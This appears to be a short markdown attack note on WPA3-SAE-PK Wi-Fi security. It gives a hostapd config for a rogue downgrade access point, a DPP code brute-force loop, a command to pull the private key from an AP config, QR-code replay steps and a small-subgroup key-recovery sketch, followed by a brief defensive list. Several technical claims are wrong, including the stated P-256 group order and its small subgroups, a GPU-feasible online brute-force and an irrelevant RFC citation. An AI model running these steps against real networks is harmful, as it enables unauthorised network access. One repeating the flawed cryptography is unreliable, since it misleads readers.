# 13 - WPA3-SAE-PK Attacks

## Overview

SAE-PK (Simultaneous Authentication of Equals - Public Key) adds public key mutual auth to SAE. Prevents offline dictionary attacks even with weak passwords. Uses DPP (Device Provisioning Protocol) for key distribution.

## SAE-PK Flow

1. SAE commit/confirm derive PMK from password
2. AP sends public key Q, client verifies via fingerprint
3. AP signs exchange with private key d, client verifies with Q

## Attack 1: Downgrade to Standard SAE

Clone AP without PK. Client falls back to standard SAE if both supported.

```bash
cat > /tmp/sae_downgrade.conf << 'EOF'
interface=wlan0
ssid=SAE-PK-Network
wpa=3
wpa_key_mgmt=SAE
sae_passwords=secretpassword123
# NO sae_private_key / sae_public_key
EOF
hostapd /tmp/sae_downgrade.conf
# Now standard SAE dictionary attack applies
```

## Attack 2: DPP Code Brute-Force

DPP uses 4-8 digit numeric codes for key exchange.

```bash
# Brute 4-digit DPP code
for code in $(seq -w 0000 9999); do
    hostapd_cli dpp_auth_init peer=<MAC> code=$code
done
# 6-digit: 1M combos (GPU feasible)
# 8-digit: 100M combos
```

## Attack 3: Private Key Extraction

```bash
# Extract from AP config
grep sae_private_key /etc/hostapd/hostapd.conf
# Key is 32-byte ECC scalar (P-256)
# If HSM/TPM: exploit firmware or side-channel
```

## Attack 4: QR Code Replay

Photograph permanent QR code on router, use for rogue device auth.

```bash
# zbarimg router_qr.png | grep DPP
# DPP:V:2;M:aa:bb:cc:dd:ee:ff;K:<base64_pubkey>;
# Use extracted key for DPP authentication on rogue device
```

## Attack 5: PK Collision (Small Subgroup)

If public key validation is weak, attacker provides point on small subgroup.

```python
# P-256 order n = 2^256 - 2^32 - 977
# Small subgroup points: order 2, 3, 5, 7, 13, 17, 19, 37, 73, 109
# If Q is not validated, attacker sends h*G where h is small
# SAE-PK signature verification on small subgroup leaks d mod h
# Collect multiple small subgroup points → CRT → recover full d
```

## Defensive Application

- Disable SAE fallback: Client refuses standard SAE if SAE-PK expected
- Large DPP codes: Use 8+ digits or alphanumeric
- Rotating PK: Change public key periodically
- TPM/HSM storage: Private key never in plaintext
- QR code concealment: Dynamic/one-time QR codes
- Subgroup validation: Verify Q is on curve with full order

## References

- Wi-Fi Alliance WPA3 Specification v3.1
- DPP Specification (Wi-Fi Alliance)
- RFC 8110: Opportunistic Wireless Encryption
- "Security Analysis of WPA3-SAE" — CCS 2020
